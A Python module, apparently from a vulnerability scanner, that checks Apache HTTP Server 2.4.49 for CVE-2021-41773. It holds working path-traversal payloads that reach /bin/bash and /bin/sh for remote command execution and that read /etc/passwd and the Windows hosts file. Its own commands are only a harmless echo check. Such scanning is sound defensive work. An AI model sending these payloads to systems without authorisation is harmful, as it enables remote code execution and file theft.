#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2021_41773_payloads = [
    {
        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
    },
    {
        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
        'data': 'echo;{RCECOMMAND}'
    },
    {
        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
    },
    {
        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
    },
    {
        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        'data': 'echo;{RCECOMMAND}'
    },
    {
        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
    },
    # * 无法RCE, 只能FileRead
    {
        'path': 'icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        'data': None
    },
    {
        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        'data': None
    },
    {
        'path': 'icons/.%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
        'data': None
    },
    {
        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
        'data': None
    },
]

def cve_2021_41773_scan(self, clients):
    ''' 在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷,
        攻击者可以使用路径遍历攻击将URL映射到网站根目录预期之外的文件
            在特定情况下, 攻击者可构造恶意请求执行系统命令
    '''
    hackClient = clients.get('hackClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE/FileRead',
        'vul_id': 'CVE-2021-41773',
    }

    for payload in cve_2021_41773_payloads:
        path = payload['path']
        data = payload['data']
        random_str = random_md5(6)                      # * 随机6位字符串

        if data:                                        # * 有POST数据则RCE, 否则为FileRead
            RCEcommand = 'echo ' + random_str
            data = data.format(RCECOMMAND=RCEcommand)
            
            res = hackClient.request(
                'post',
                path,
                data=data,
                vul_info=vul_info
            )
        else:
            res = hackClient.request(
                'get',
                path,
                vul_info=vul_info
            )
        if res is None:
            continue

        if (
            (check.check_res(res.text, random_str))
            or (check.check_res_fileread(res.text))
        ):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
